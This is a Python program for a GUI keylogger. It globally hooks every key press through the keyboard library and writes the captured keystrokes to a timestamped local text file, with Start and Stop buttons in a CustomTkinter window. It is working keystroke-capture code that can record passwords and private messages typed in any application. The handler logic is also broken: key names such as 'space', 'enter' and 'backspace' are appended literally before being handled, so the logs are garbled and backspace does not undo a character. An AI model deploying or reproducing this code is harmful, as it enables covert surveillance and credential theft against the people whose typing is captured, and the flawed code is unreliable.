import keyboard  # Library to handle keyboard events
import time
from datetime import datetime
import customtkinter as ctk  # CustomTkinter for a modern GUI
from tkinter import messagebox  # For displaying error messages

# Keylogger class
class Keylogger:
    def __init__(self):
        self.is_logging = False
        self.log_file = self._generate_log_filename()  # Generate a unique filename
        self.current_line = ""  # Stores pressed keys in a single line

    def _generate_log_filename(self):
        # Generate a unique filename based on the current date and time
        now = datetime.now()
        return f"keylog_{now.strftime('%Y%m%d_%H%M%S')}.txt"

    def on_key_press(self, event):
        try:
            if self.is_logging:
                self.current_line += event.name  # Add the pressed key to the current line
                # If "space" or "enter" is pressed, write the line to the file
                if event.name == "space":
                    self.current_line += " "
                elif event.name == "enter":
                    self.current_line += "\n"  # New line when "Enter" is pressed
                    self._write_to_file()
                elif event.name == "backspace":
                    self.current_line = self.current_line[:-1]  # Remove the last character
        except Exception as e:
            print(f"Error in on_key_press: {e}")  # Log the error to the console

    def _write_to_file(self):
        try:
            with open(self.log_file, "a") as f:
                f.write(self.current_line)
            self.current_line = ""  # Reset the current line
        except Exception as e:
            print(f"Error writing to file: {e}")  # Log the error to the console

    def start(self):
        try:
            self.is_logging = True
            keyboard.on_press(self.on_key_press)
        except Exception as e:
            print(f"Error starting keylogger: {e}")  # Log the error to the console

    def stop(self):
        try:
            self.is_logging = False
            keyboard.unhook_all()
            if self.current_line:  # Write any remaining content when stopping
                self._write_to_file()
        except Exception as e:
            print(f"Error stopping keylogger: {e}")  # Log the error to the console

# GUI class with CustomTkinter
class KeyloggerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Keylogger with GUI")
        self.geometry("400x300")
        self.keylogger = Keylogger()

        # Configure the theme
        ctk.set_appearance_mode("dark")  # Dark mode
        ctk.set_default_color_theme("blue")  # Blue theme

        # GUI Elements
        self.title_label = ctk.CTkLabel(self, text="Keylogger", font=("Arial", 24, "bold"))
        self.title_label.pack(pady=20)

        self.status_label = ctk.CTkLabel(self, text="Status: Stopped", font=("Arial", 16))
        self.status_label.pack(pady=10)

        self.start_button = ctk.CTkButton(self, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = ctk.CTkButton(self, text="Stop Keylogger", command=self.stop_keylogger, state="disabled")
        self.stop_button.pack(pady=10)

        self.exit_button = ctk.CTkButton(self, text="Exit", command=self.destroy)
        self.exit_button.pack(pady=20)

    def start_keylogger(self):
        try:
            self.keylogger.start()
            self.status_label.configure(text="Status: Running", text_color="green")
            self.start_button.configure(state="disabled")
            self.stop_button.configure(state="normal")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start keylogger: {e}")  # Show error message

    def stop_keylogger(self):
        try:
            self.keylogger.stop()
            self.status_label.configure(text="Status: Stopped", text_color="red")
            self.start_button.configure(state="normal")
            self.stop_button.configure(state="disabled")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop keylogger: {e}")  # Show error message

# Run the application
if __name__ == "__main__":
    try:
        app = KeyloggerApp()
        app.mainloop()
    except Exception as e:
        print(f"Application error: {e}")  # Log the error to the console